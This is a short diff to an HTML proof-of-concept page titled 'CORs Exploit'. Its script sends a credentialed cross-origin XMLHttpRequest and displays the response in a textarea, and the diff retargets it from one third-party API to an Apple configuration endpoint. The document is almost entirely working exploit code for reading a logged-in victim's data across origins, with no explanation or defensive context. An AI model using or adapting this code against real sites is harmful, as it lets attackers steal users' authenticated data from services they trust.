@@ -4,7 +4,6 @@
 <body>
 <center>
 <h2>CORs Exploit</h2>
-  <!--https://xp.apple.com/config/1/report/xp_its_music_main.   -->
   <h1></h1>
 <textarea rows="10" cols="60" id="pwnz">
 </textarea><br>
@@ -19,7 +18,7 @@ function cors() {
       document.getElementById("pwnz").innerHTML = this.responseText;
     }
   };
-  xhttp.open("GET", "https://test1-api.myoas.net", true);
+  xhttp.open("GET", "https://xp.apple.com/config/1/report/xp_its_music_main", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
